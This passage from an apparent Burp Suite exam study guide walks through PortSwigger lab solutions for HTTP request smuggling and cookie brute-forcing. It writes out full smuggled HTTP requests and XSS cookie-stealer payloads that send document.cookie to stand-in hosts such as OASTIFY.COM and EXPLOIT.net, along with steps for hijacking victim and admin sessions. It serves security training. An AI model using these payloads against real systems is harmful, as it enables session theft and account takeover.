242\nTransfer-Encoding: chunked\n\n0\n\nPOST /post/comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 798\nCookie: session=HackerCurrentCookieValue\n\ncsrf=ValidCSRFCookieValue\u0026amp;postId=8\u0026amp;name=c\u0026amp;email=c%40c.c\u0026amp;website=\u0026amp;comment=c\"\u003e\u003cpre\u003ePOST / HTTP/1.1\nHost: TARGET.net\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 242\nTransfer-Encoding: chunked\n\n0\n\nPOST /post/comment HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 798\nCookie: session=HackerCurrentCookieValue\n\ncsrf=ValidCSRFCookieValue\u0026amp;postId=8\u0026amp;name=c\u0026amp;email=c%40c.c\u0026amp;website=\u0026amp;comment=c\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/content-length-capture-victim-request.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/content-length-capture-victim-request.png\" alt=\"Exploiting HTTP request smuggling with content-length value\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNo new line at end of the smuggled POST request above^^.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eView the blog \u003cstrong\u003epost\u003c/strong\u003e to see if there's a comment containing a user's request. Note that once the victim user browses the target website, then only will the attack be successful. Copy the user's Cookie header from the blog post comment, and use the cookie to access victim's account.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/victim-request-captured-blog-comment.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/victim-request-captured-blog-comment.png\" alt=\"Exploiting HTTP request smuggling to capture other users' requests\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting HTTP request smuggling to capture other users' requests\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCL.TE multiCase - User-Agent Cookie Stealer\u003c/h3\u003e\u003ca id=\"user-content-clte-multicase---user-agent-cookie-stealer\" class=\"anchor\" aria-label=\"Permalink: CL.TE multiCase - User-Agent Cookie Stealer\" href=\"#clte-multicase---user-agent-cookie-stealer\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the UserAgent value is stored in the GET request loading the blog comment form, and stored in \u003cstrong\u003eUser-Agent\u003c/strong\u003e hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using \u003cstrong\u003eUser-Agent\u003c/strong\u003e value that is then placed in a smuggled request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBasic Cross Site Scripting Payload escaping out of HTML document.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\" \u0026quot;/\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e \"/\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCOOKIE STEALER Payload.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"a\u0026quot;/\u0026gt;\u0026lt;script\u0026gt;document.location='http://OASTIFY.COM/?cookiestealer='+document.cookie;\u0026lt;/script\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-s1\"\u003ea\u003c/span\u003e\"/\u0026gt;\u0026lt;script\u0026gt;document.location='http://OASTIFY.COM/?cookiestealer='+document.cookie;\u0026lt;/script\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSmuggle this XSS request to the back-end server, so that it exploits the next visitor. Place the XSS cookie stealer in \u003cstrong\u003eUser-Agent\u003c/strong\u003e header.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST / HTTP/1.1\nHost: TARGET.net\nContent-Length: 237\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=4 HTTP/1.1\nUser-Agent: a\u0026quot;/\u0026gt;\u0026lt;script\u0026gt;document.location='http://OASTIFY.COM/?Hack='+document.cookie;\u0026lt;/script\u0026gt;\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1\"\u003e\u003cpre\u003ePOST / HTTP/1.1\nHost: TARGET.net\nContent-Length: 237\nContent-Type: application/x-www-form-urlencoded\nTransfer-Encoding: chunked\n\n0\n\nGET /post?postId=4 HTTP/1.1\nUser-Agent: a\"/\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'http://OASTIFY.COM/?Hack='\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+\u003c/span\u003e\u003cspan class=\"pl-smi\"\u003edocument\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003ecookie\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nx=1\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/user-agent-cookie-stealer-smuggled.PNG\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/user-agent-cookie-stealer-smuggled.PNG\" alt=\"HTTP request smuggling to deliver reflected XSS and steal victim cookie\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCheck the PortSwigger Collaborator Request received from victim browsing target.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/collaborator-xss-Request-received.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/collaborator-xss-Request-received.png\" alt=\"Collaborator capture XSS Request from victim browsing target\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss\" rel=\"nofollow\"\u003ePortSwigger Lab: Exploiting HTTP request smuggling to deliver reflected XSS\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHTTP/2 smuggling via CRLF injection\u003c/h3\u003e\u003ca id=\"user-content-http2-smuggling-via-crlf-injection\" class=\"anchor\" aria-label=\"Permalink: HTTP/2 smuggling via CRLF injection\" href=\"#http2-smuggling-via-crlf-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget is vulnerable to request smuggling because the front-end server \u003cstrong\u003edowngrades HTTP/2\u003c/strong\u003e requests and fails to adequately sanitize incoming headers. Exploitation is by use of an HTTP/2-exclusive request smuggling vector to steal a victims session cookie and gain access to user's account.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/recent-searchs.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/recent-searchs.png\" alt=\"recent searches\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eExpand the Inspector's Request Attributes section and change the protocol to HTTP/2, then append arbitrary header \u003ccode\u003efoo\u003c/code\u003e with value \u003ccode\u003ebar\u003c/code\u003e, follow with the sequence \u003ccode\u003e\\r\\n\u003c/code\u003e, then followed by the \u003ccode\u003eTransfer-Encoding: chunked\u003c/code\u003e, by pressing \u003cstrong\u003eshift+ENTER\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/http2-inspector.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/http2-inspector.png\" alt=\"http2-inspector\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: enable the \u003cstrong\u003eAllow HTTP/2 ALPN override\u003c/strong\u003e option and change the body of HTTP/2 request to below POST request.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=HACKER-SESSION-COOKIE\nContent-Length: 800\n\nsearch=nutty\"\u003e\u003cpre\u003e0\n\nPOST / HTTP/1.1\nHost: YOUR-LAB-ID.web-security-academy.net\nCookie: session=HACKER-SESSION-COOKIE\nContent-Length: 800\n\nsearch=nutty\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/http2-smuggle-via-crlf-inject.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/http2-smuggle-via-crlf-inject.png\" alt=\"http2 smuggle via crlf inject\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection\" rel=\"nofollow\"\u003ePortSwigger Lab: HTTP/2 request smuggling via CRLF injection\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/E-bnCGzl7Rk\" rel=\"nofollow\"\u003eYoutube demo HTTP/2 request smuggling via CRLF injection\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eHTTP/2 TE desync v10a h2path\u003c/h3\u003e\u003ca id=\"user-content-http2-te-desync-v10a-h2path\" class=\"anchor\" aria-label=\"Permalink: HTTP/2 TE desync v10a h2path\" href=\"#http2-te-desync-v10a-h2path\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTarget is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length. Steal the  session cookie, of the admin visiting the target. The Burp extension, \u003cstrong\u003eHTTP Request Smuggler\u003c/strong\u003e will \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the vulnerability as HTTP/2 TE desync v10a (H2.TE) vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/HTTP2-TE-desync-v10a-h2path.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/HTTP2-TE-desync-v10a-h2path.png\" alt=\"HTTP/2 TE desync v10a h2path\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: Switch to \u003cstrong\u003eHTTP/2\u003c/strong\u003e in the inspector request attributes and Enable the \u003cstrong\u003eAllow HTTP/2 ALPN override\u003c/strong\u003e option in repeat menu.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"POST /x HTTP/2\nHost: TARGET.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: TARGET.web-security-academy.net\\r\\n\n\\r\\n\"\u003e\u003cpre\u003ePOST /x HTTP/2\nHost: TARGET.net\nTransfer-Encoding: chunked\n\n0\n\nGET /x HTTP/1.1\nHost: TARGET.web-security-academy.net\\r\\n\n\\r\\n\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: Paths in both POST and GET requests points to non-existent endpoints. This help to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e when not getting a 404 response, the response is from victim user captured request. \u003cstrong\u003eRemember\u003c/strong\u003e to terminate the smuggled request properly by including the sequence \u003ccode\u003e\\r\\n\\r\\n\u003c/code\u003e after the Host header.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/302-stolen-admin-cookie.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/302-stolen-admin-cookie.png\" alt=\"302 Response once stolen admin cookie request captured\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eCopy stolen session cookie value into new \u003cstrong\u003ehttp/2\u003c/strong\u003e GET request to the admin panel.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"GET /admin HTTP/2\nHost: TARGET.web-security-academy.net\nCookie: session=VictimAdminSessionCookieValue\nCache-Control: max-age=0\nSec-Ch-Ua: \u0026quot;Chromium\u0026quot;;v=\u0026quot;109\u0026quot;, \u0026quot;Not_A Brand\u0026quot;;v=\u0026quot;99\u0026quot;\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \u0026quot;Linux\u0026quot;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003eGET /admin HTTP/2\nHost: TARGET.web-security-academy.net\nCookie: session=VictimAdminSessionCookieValue\nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Linux\"\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/admin-panel-access.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/admin-panel-access.png\" alt=\"admin-panel-access\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling\" rel=\"nofollow\"\u003ePortSwigger Lab: Response queue poisoning via H2.TE request smuggling\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBrute Force\u003c/h2\u003e\u003ca id=\"user-content-brute-force\" class=\"anchor\" aria-label=\"Permalink: Brute Force\" href=\"#brute-force\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#stay-logged-in\"\u003eStay-Logged-in\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#stay-logged-in-offline-crack\"\u003eStay-logged-in Offline Crack\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#brute-force-protected-login\"\u003eBrute Force Protected Login\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#subtly-invalid-login\"\u003eSubtly Invalid Login\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eStay-Logged-in\u003c/h3\u003e\u003ca id=\"user-content-stay-logged-in\" class=\"anchor\" aria-label=\"Permalink: Stay-Logged-in\" href=\"#stay-logged-in\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eLogin option with a stay-logged-in check-box result in Cookie value containing the password of the user logged in and is vulnerable to brute-forcing.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stay-logged-in.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stay-logged-in.png\" alt=\"stay-logged-in\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe exploit steps below plus the Intruder Payload processing rules in order and including the GREP option in sequence before starting the attack.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003col dir=\"auto\"\u003e\n\u003cli\u003eLogout as current user.\u003c/li\u003e\n\u003cli\u003eSend the most recent GET /my-account request to Burp Intruder.\u003c/li\u003e\n\u003cli\u003eSelect the cookie: \u003ccode\u003estay-logged-in\u003c/code\u003e as injection position.\u003c/li\u003e\n\u003cli\u003eHash: \u003ccode\u003eMD5\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAdd prefix: \u003ccode\u003ecarlos:\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eEncode: \u003ccode\u003eBase64-encode\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAdd \u003cstrong\u003eGREP\u003c/strong\u003e under settings tab, to check for the string in the response \u003ccode\u003eUpdate email\u003c/code\u003e indicating successfully logged in attack.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/brute.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/brute.png\" alt=\"brute\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie\" rel=\"nofollow\"\u003ePortSwigger Lab: Brute-forcing a stay-logged-in cookie\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eStay-logged-in Offline Crack\u003c/h3\u003e\u003ca id=\"user-content-stay-logged-in-offline-crack\" class=\"anchor\" aria-label=\"Permalink: Stay-logged-in Offline Crack\" href=\"#stay-logged-in-offline-crack\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe blog application comment function is vulnerable to \u003ca href=\"#stored-xss\"\u003estored XSS\u003c/a\u003e, use the below payload in blog comment to send the session cookie of Carlos to the exploit server.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\ndocument.location='https://EXPLOIT.net/StealCookie='+document.cookie\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\ndocument.location='https://EXPLOIT.net/StealCookie='+document.cookie\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBase64 decode the \u003ccode\u003estay-logged-in\u003c/code\u003e cookie value and use an online \u003cstrong\u003eMD5\u003c/strong\u003e hash crack station database.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/stay-logged-in-offline.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/stay-logged-in-offline.png\" alt=\"stay-logged-in Offline\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp 